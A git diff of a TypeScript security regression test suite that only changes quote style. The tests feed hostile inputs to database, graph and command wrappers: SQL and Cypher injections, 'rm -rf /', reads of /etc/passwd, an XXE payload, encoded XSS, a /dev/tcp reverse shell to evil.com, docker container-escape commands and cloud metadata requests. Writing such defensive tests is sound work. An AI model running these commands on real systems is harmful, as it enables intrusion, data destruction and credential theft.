@@ -6,13 +6,13 @@
  * @security OWASP Top 10 & MITRE ATLAS compliance
  */
 
-import { SecureDatabaseWrapper } from "@cortex-os/mvp-core/src/secure-db";
-import { SecureCommandExecutor } from "@cortex-os/mvp-core/src/secure-executor";
-import { SecureNeo4j } from "@cortex-os/utils";
-import { afterEach, beforeEach, describe, expect, test, vi } from "vitest";
+import { SecureDatabaseWrapper } from '@cortex-os/mvp-core/src/secure-db';
+import { SecureCommandExecutor } from '@cortex-os/mvp-core/src/secure-executor';
+import { SecureNeo4j } from '@cortex-os/utils';
+import { afterEach, beforeEach, describe, expect, test, vi } from 'vitest';
 
 // Mock external dependencies
-vi.mock("better-sqlite3", () => {
+vi.mock('better-sqlite3', () => {
 	const mockStatement = {
 		run: vi.fn().mockReturnValue({}),
 		get: vi.fn().mockReturnValue({}),
@@ -31,7 +31,7 @@ vi.mock("better-sqlite3", () => {
 	};
 });
 
-vi.mock("neo4j-driver", () => {
+vi.mock('neo4j-driver', () => {
 	const mockRecord = {
 		get: vi.fn().mockReturnValue([]),
 	};
@@ -60,7 +60,7 @@ vi.mock("neo4j-driver", () => {
 	};
 });
 
-vi.mock("child_process", () => {
+vi.mock('child_process', () => {
 	const mockChildProcess = {
 		stdout: {
 			on: vi.fn(),
@@ -80,7 +80,7 @@ vi.mock("child_process", () => {
 	};
 });
 
-describe("Security Regression Tests", () => {
+describe('Security Regression Tests', () => {
 	let secureDb: SecureDatabaseWrapper;
 	let secureNeo4j: SecureNeo4j;
 	let mockDatabase: any;
@@ -115,30 +115,30 @@ describe("Security Regression Tests", () => {
 		};
 
 		secureDb = new SecureDatabaseWrapper(mockDatabase);
-		secureNeo4j = new SecureNeo4j("bolt://localhost:7687", "neo4j", "password");
+		secureNeo4j = new SecureNeo4j('bolt://localhost:7687', 'neo4j', 'password');
 	});
 
 	afterEach(() => {
 		vi.clearAllMocks();
 	});
 
-	describe("Previously Identified Vulnerabilities", () => {
-		test("should prevent CVE-2023-XXXXX: SQL Injection in Database Operations", () => {
+	describe('Previously Identified Vulnerabilities', () => {
+		test('should prevent CVE-2023-XXXXX: SQL Injection in Database Operations', () => {
 			// Previously identified vulnerability: Direct string concatenation in SQL queries
 			const maliciousInput = "123'; DROP TABLE users; --";
 
 			// This should be prevented by parameterized queries
 			expect(() => {
-				secureDb.secureRun("SELECT * FROM users WHERE id = ?", maliciousInput);
+				secureDb.secureRun('SELECT * FROM users WHERE id = ?', maliciousInput);
 			}).not.toThrow();
 
 			// Verify the malicious input is properly escaped/parameterized
 			expect(mockDatabase.prepare).toHaveBeenCalledWith(
-				"SELECT * FROM users WHERE id = ?",
+				'SELECT * FROM users WHERE id = ?',
 			);
 		});
 
-		test("should prevent CVE-2023-YYYYY: Cypher Injection in Graph Operations", async () => {
+		test('should prevent CVE-2023-YYYYY: Cypher Injection in Graph Operations', async () => {
 			// Previously identified vulnerability: Direct string interpolation in Cypher queries
 			const maliciousNodeId =
 				"123'; DELETE n; CREATE (m {compromised: 'true'});";
@@ -149,9 +149,9 @@ describe("Security Regression Tests", () => {
 			}).rejects.toThrow(/Invalid node ID/);
 		});
 
-		test("should prevent CVE-2023-ZZZZZ: Command Injection in Process Execution", async () => {
+		test('should prevent CVE-2023-ZZZZZ: Command Injection in Process Execution', async () => {
 			// Previously identified vulnerability: Direct string concatenation in command execution
-			const maliciousCommand = ["echo", "test'; rm -rf /; echo 'compromised"];
+			const maliciousCommand = ['echo', "test'; rm -rf /; echo 'compromised"];
 
 			// This should be prevented by command validation
 			await expect(async () => {
@@ -159,20 +159,20 @@ describe("Security Regression Tests", () => {
 			}).rejects.toThrow(/Invalid characters in command/);
 		});
 
-		test("should prevent CVE-2023-AAAAA: Path Traversal in File Operations", async () => {
+		test('should prevent CVE-2023-AAAAA: Path Traversal in File Operations', async () => {
 			// Previously identified vulnerability: Unsafe file path handling
-			const maliciousFilePath = "../../../../etc/passwd";
+			const maliciousFilePath = '../../../../etc/passwd';
 
 			// This should be prevented by path validation
 			const result = await SecureCommandExecutor.validateParameter(
 				maliciousFilePath,
-				"filePath",
+				'filePath',
 			);
 			expect(result.isValid).toBe(false);
-			expect(result.reason).toContain("Invalid characters");
+			expect(result.reason).toContain('Invalid characters');
 		});
 
-		test("should prevent CVE-2023-BBBBB: XML External Entity (XXE) Processing", async () => {
+		test('should prevent CVE-2023-BBBBB: XML External Entity (XXE) Processing', async () => {
 			// Previously identified vulnerability: Unsafe XML processing
 			const maliciousXml =
 				'<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>';
@@ -180,14 +180,14 @@ describe("Security Regression Tests", () => {
 			// This should be prevented by XML validation/sanitization
 			// Note: Actual XXE prevention would happen at the XML parsing level
 			const sanitizedXml = SecureCommandExecutor.sanitizeOutput(maliciousXml);
-			expect(sanitizedXml).not.toContain("<!ENTITY");
-			expect(sanitizedXml).not.toContain("SYSTEM");
-			expect(sanitizedXml).not.toContain("&xxe;");
+			expect(sanitizedXml).not.toContain('<!ENTITY');
+			expect(sanitizedXml).not.toContain('SYSTEM');
+			expect(sanitizedXml).not.toContain('&xxe;');
 		});
 	});
 
-	describe("Previously Exploited Attack Vectors", () => {
-		test("should prevent OWASP A03:2021 - Injection Attacks", () => {
+	describe('Previously Exploited Attack Vectors', () => {
+		test('should prevent OWASP A03:2021 - Injection Attacks', () => {
 			// Test various injection vectors that were previously exploited
 
 			// SQL Injection
@@ -200,7 +200,7 @@ describe("Security Regression Tests", () => {
 
 			sqlInjections.forEach((injection) => {
 				expect(() => {
-					secureDb.secureRun("SELECT * FROM users WHERE id = ?", injection);
+					secureDb.secureRun('SELECT * FROM users WHERE id = ?', injection);
 				}).not.toThrow(); // Parameterized queries prevent injection
 			});
 
@@ -215,8 +215,8 @@ describe("Security Regression Tests", () => {
 			cypherInjections.forEach(async (injection) => {
 				const node = {
 					id: injection,
-					label: "User",
-					props: { name: "John" },
+					label: 'User',
+					props: { name: 'John' },
 				};
 
 				await expect(async () => {
@@ -226,10 +226,10 @@ describe("Security Regression Tests", () => {
 
 			// Command Injection
 			const commandInjections = [
-				["echo", "test'; rm -rf /"],
-				["ls", "-la;", "cat", "/etc/passwd"],
-				["docker", "ps", "&&", "whoami"],
-				["git", "clone", "repo;", "cd", "repo;", "./malicious.sh"],
+				['echo', "test'; rm -rf /"],
+				['ls', '-la;', 'cat', '/etc/passwd'],
+				['docker', 'ps', '&&', 'whoami'],
+				['git', 'clone', 'repo;', 'cd', 'repo;', './malicious.sh'],
 			];
 
 			commandInjections.forEach(async (injection) => {
@@ -239,11 +239,11 @@ describe("Security Regression Tests", () => {
 			});
 		});
 
-		test("should prevent OWASP A07:2021 - Identification and Authentication Failures", () => {
+		test('should prevent OWASP A07:2021 - Identification and Authentication Failures', () => {
 			// Test credential-related attacks that were previously successful
 
 			// Password spraying attempts
-			const weakPasswords = ["123456", "password", "admin", "root"];
+			const weakPasswords = ['123456', 'password', 'admin', 'root'];
 			weakPasswords.forEach((password) => {
 				// Our system should enforce strong password policies
 				// This would be handled at the application level, not in the security wrappers
@@ -251,7 +251,7 @@ describe("Security Regression Tests", () => {
 			});
 
 			// Credential stuffing attempts
-			const commonUsernames = ["admin", "root", "user", "test"];
+			const commonUsernames = ['admin', 'root', 'user', 'test'];
 			commonUsernames.forEach((username) => {
 				// Our system should rate-limit login attempts
 				// This would be handled at the application level, not in the security wrappers
@@ -259,7 +259,7 @@ describe("Security Regression Tests", () => {
 			});
 		});
 
-		test("should prevent OWASP A04:2021 - Insecure Design", () => {
+		test('should prevent OWASP A04:2021 - Insecure Design', () => {
 			// Test design flaws that were previously exploited
 
 			// Business logic flaws
@@ -278,11 +278,11 @@ describe("Security Regression Tests", () => {
 			});
 		});
 
-		test("should prevent OWASP A05:2021 - Security Misconfiguration", () => {
+		test('should prevent OWASP A05:2021 - Security Misconfiguration', () => {
 			// Test misconfigurations that were previously exploitable
 
 			// Debug mode enabled
-			const debugModes = [true, "true", 1, "1"];
+			const debugModes = [true, 'true', 1, '1'];
 			debugModes.forEach((debugMode) => {
 				// Our system should ensure debug mode is disabled in production
 				// This would be handled at the application level, not in the security wrappers
@@ -291,9 +291,9 @@ describe("Security Regression Tests", () => {
 
 			// Verbose error messages
 			const verboseErrors = [
-				"Database error: SELECT * FROM users WHERE id = ",
-				"File not found: /etc/passwd",
-				"Stack trace: at line 123 in file.php",
+				'Database error: SELECT * FROM users WHERE id = ',
+				'File not found: /etc/passwd',
+				'Stack trace: at line 123 in file.php',
 			];
 
 			verboseErrors.forEach((error) => {
@@ -304,14 +304,14 @@ describe("Security Regression Tests", () => {
 		});
 	});
 
-	describe("Previously Bypassed Security Controls", () => {
-		test("should prevent bypass of input validation through encoding", async () => {
+	describe('Previously Bypassed Security Controls', () => {
+		test('should prevent bypass of input validation through encoding', async () => {
 			// Test various encoding techniques that were previously used to bypass validation
 
 			// URL encoding
 			const urlEncodedInputs = [
-				"123%27%3B%20DROP%20TABLE%20users%3B%20--", // ' DROP TABLE users; --
-				"%27%20OR%20%271%27%3D%271", // ' OR '1'='1
+				'123%27%3B%20DROP%20TABLE%20users%3B%20--', // ' DROP TABLE users; --
+				'%27%20OR%20%271%27%3D%271', // ' OR '1'='1
 			];
 
 			urlEncodedInputs.forEach(async (encodedInput) => {
@@ -319,13 +319,13 @@ describe("Security Regression Tests", () => {
 				const decodedInput = decodeURIComponent(encodedInput);
 
 				// Validate the decoded input
-				const result = secureDb.validateInput(decodedInput, "id");
+				const result = secureDb.validateInput(decodedInput, 'id');
 				expect(result).toBe(false); // Should be rejected
 			});
 
 			// Unicode encoding
 			const unicodeEncodedInputs = [
-				"\\u0027\\u003B\\u0020DROP\\u0020TABLE\\u0020users\\u003B\\u0020--", // ' DROP TABLE users; --
+				'\\u0027\\u003B\\u0020DROP\\u0020TABLE\\u0020users\\u003B\\u0020--', // ' DROP TABLE users; --
 			];
 
 			unicodeEncodedInputs.forEach(async (encodedInput) => {
@@ -338,26 +338,26 @@ describe("Security Regression Tests", () => {
 				);
 
 				// Validate the decoded input
-				const result = secureDb.validateInput(decodedInput, "id");
+				const result = secureDb.validateInput(decodedInput, 'id');
 				expect(result).toBe(false); // Should be rejected
 			});
 		});
 
-		test("should prevent bypass of command validation through obfuscation", async () => {
+		test('should prevent bypass of command validation through obfuscation', async () => {
 			// Test various obfuscation techniques that were previously used to bypass validation
 
 			// Case variation
 			const caseVariations = [
-				["EcHo", "test"], // Mixed case
-				["DOCKER", "PS"], // Uppercase
-				["DoCkEr", "Ps"], // Mixed case variations
+				['EcHo', 'test'], // Mixed case
+				['DOCKER', 'PS'], // Uppercase
+				['DoCkEr', 'Ps'], // Mixed case variations
 			];
 
 			caseVariations.forEach(async (variation) => {
 				const result = await SecureCommandExecutor.validateCommand(variation);
 				if (
-					variation[0].toLowerCase() === "echo" ||
-					variation[0].toLowerCase() === "docker"
+					variation[0].toLowerCase() === 'echo' ||
+					variation[0].toLowerCase() === 'docker'
 				) {
 					expect(result.success).toBe(true); // Should be allowed for whitelisted commands
 				} else {
@@ -367,9 +367,9 @@ describe("Security Regression Tests", () => {
 
 			// Whitespace manipulation
 			const whitespaceManipulations = [
-				["echo", " ", "test"], // Extra spaces
-				["\techo\t", "test"], // Tabs
-				["\necho\n", "test"], // Newlines
+				['echo', ' ', 'test'], // Extra spaces
+				['\techo\t', 'test'], // Tabs
+				['\necho\n', 'test'], // Newlines
 			];
 
 			whitespaceManipulations.forEach(async (manipulation) => {
@@ -379,23 +379,23 @@ describe("Security Regression Tests", () => {
 			});
 		});
 
-		test("should prevent bypass of output sanitization", async () => {
+		test('should prevent bypass of output sanitization', async () => {
 			// Test various techniques that were previously used to bypass output sanitization
 
 			// Hexadecimal encoding
 			const hexEncodedScripts = [
-				"\\x3c\\x73\\x63\\x72\\x69\\x70\\x74\\x3e\\x61\\x6c\\x65\\x72\\x74\\x28\\x22\\x58\\x53\\x53\\x22\\x29\\x3c\\x2f\\x73\\x63\\x72\\x69\\x70\\x74\\x3e", // <script>alert("XSS")</script>
+				'\\x3c\\x73\\x63\\x72\\x69\\x70\\x74\\x3e\\x61\\x6c\\x65\\x72\\x74\\x28\\x22\\x58\\x53\\x53\\x22\\x29\\x3c\\x2f\\x73\\x63\\x72\\x69\\x70\\x74\\x3e', // <script>alert("XSS")</script>
 			];
 
 			hexEncodedScripts.forEach((hexScript) => {
 				const sanitizedOutput = SecureCommandExecutor.sanitizeOutput(hexScript);
-				expect(sanitizedOutput).not.toContain("<script>");
-				expect(sanitizedOutput).not.toContain("alert");
+				expect(sanitizedOutput).not.toContain('<script>');
+				expect(sanitizedOutput).not.toContain('alert');
 			});
 
 			// Base64 encoding
 			const base64EncodedScripts = [
-				"PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=", // <script>alert("XSS")</script>
+				'PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=', // <script>alert("XSS")</script>
 			];
 
 			base64EncodedScripts.forEach((base64Script) => {
@@ -404,8 +404,8 @@ describe("Security Regression Tests", () => {
 					const decodedScript = atob(base64Script);
 					const sanitizedOutput =
 						SecureCommandExecutor.sanitizeOutput(decodedScript);
-					expect(sanitizedOutput).not.toContain("<script>");
-					expect(sanitizedOutput).not.toContain("alert");
+					expect(sanitizedOutput).not.toContain('<script>');
+					expect(sanitizedOutput).not.toContain('alert');
 				} catch (_error) {
 					// If decoding fails, treat as regular string
 					const sanitizedOutput =
@@ -416,8 +416,8 @@ describe("Security Regression Tests", () => {
 		});
 	});
 
-	describe("Previously Undetected Attack Patterns", () => {
-		test("should detect and prevent zero-day attack patterns", () => {
+	describe('Previously Undetected Attack Patterns', () => {
+		test('should detect and prevent zero-day attack patterns', () => {
 			// Test emerging attack patterns that weren't previously identified
 
 			// Advanced SQL injection techniques
@@ -429,14 +429,14 @@ describe("Security Regression Tests", () => {
 
 			advancedSqlInjections.forEach((injection) => {
 				expect(() => {
-					secureDb.secureRun("SELECT * FROM users WHERE id = ?", injection);
+					secureDb.secureRun('SELECT * FROM users WHERE id = ?', injection);
 				}).not.toThrow(); // Parameterized queries prevent injection
 			});
 
 			// Advanced command injection techniques
 			const advancedCommandInjections = [
-				["sh", "-c", "echo test | sh"], // Pipe with shell execution
-				["bash", "-c", "exec 3<>/dev/tcp/evil.com/80 && cat <&3"], // Reverse shell
+				['sh', '-c', 'echo test | sh'], // Pipe with shell execution
+				['bash', '-c', 'exec 3<>/dev/tcp/evil.com/80 && cat <&3'], // Reverse shell
 			];
 
 			advancedCommandInjections.forEach(async (injection) => {
@@ -446,35 +446,35 @@ describe("Security Regression Tests", () => {
 			});
 		});
 
-		test("should prevent attacks targeting new technologies", async () => {
+		test('should prevent attacks targeting new technologies', async () => {
 			// Test attack patterns targeting newer technologies we use
 
 			// Container escape techniques
 			const containerEscapes = [
 				[
-					"docker",
-					"run",
-					"--privileged",
-					"-v",
-					"/:/host",
-					"alpine",
-					"sh",
-					"-c",
-					"echo compromised > /host/tmp/pwned",
+					'docker',
+					'run',
+					'--privileged',
+					'-v',
+					'/:/host',
+					'alpine',
+					'sh',
+					'-c',
+					'echo compromised > /host/tmp/pwned',
 				],
 				[
-					"docker",
-					"run",
-					"--pid=host",
-					"alpine",
-					"nsenter",
-					"-t",
-					"1",
-					"-m",
-					"-u",
-					"-n",
-					"-i",
-					"sh",
+					'docker',
+					'run',
+					'--pid=host',
+					'alpine',
+					'nsenter',
+					'-t',
+					'1',
+					'-m',
+					'-u',
+					'-n',
+					'-i',
+					'sh',
 				],
 			];
 
@@ -486,8 +486,8 @@ describe("Security Regression Tests", () => {
 
 			// Cloud provider metadata access
 			const metadataAccessAttempts = [
-				["curl", "http://169.254.169.254/latest/meta-data/"],
-				["wget", "http://metadata.google.internal/computeMetadata/v1/"],
+				['curl', 'http://169.254.169.254/latest/meta-data/'],
+				['wget', 'http://metadata.google.internal/computeMetadata/v1/'],
 			];
 
 			metadataAccessAttempts.forEach(async (metadataAttempt) => {
@@ -498,14 +498,14 @@ describe("Security Regression Tests", () => {
 		});
 	});
 
-	describe("Previously Successful Privilege Escalation Attempts", () => {
-		test("should prevent privilege escalation through environment variables", async () => {
+	describe('Previously Successful Privilege Escalation Attempts', () => {
+		test('should prevent privilege escalation through environment variables', async () => {
 			// Test environment variable manipulation that was previously successful
 
 			// PATH manipulation
 			const pathManipulations = [
-				["PATH=/tmp:/usr/bin:/bin", "echo", "test"], // Modified PATH
-				["LD_PRELOAD=/tmp/malicious.so", "ls"], // Library injection
+				['PATH=/tmp:/usr/bin:/bin', 'echo', 'test'], // Modified PATH
+				['LD_PRELOAD=/tmp/malicious.so', 'ls'], // Library injection
 			];
 
 			pathManipulations.forEach(async (manipulation) => {
@@ -515,13 +515,13 @@ describe("Security Regression Tests", () => {
 			});
 		});
 
-		test("should prevent privilege escalation through file descriptor manipulation", async () => {
+		test('should prevent privilege escalation through file descriptor manipulation', async () => {
 			// Test file descriptor manipulation that was previously successful
 
 			// File descriptor redirection
 			const fdManipulations = [
-				["echo", "test", ">&2"], // Redirect to stderr
-				["ls", "2>&1"], // Redirect stderr to stdout
+				['echo', 'test', '>&2'], // Redirect to stderr
+				['ls', '2>&1'], // Redirect stderr to stdout
 			];
 
 			fdManipulations.forEach(async (manipulation) => {
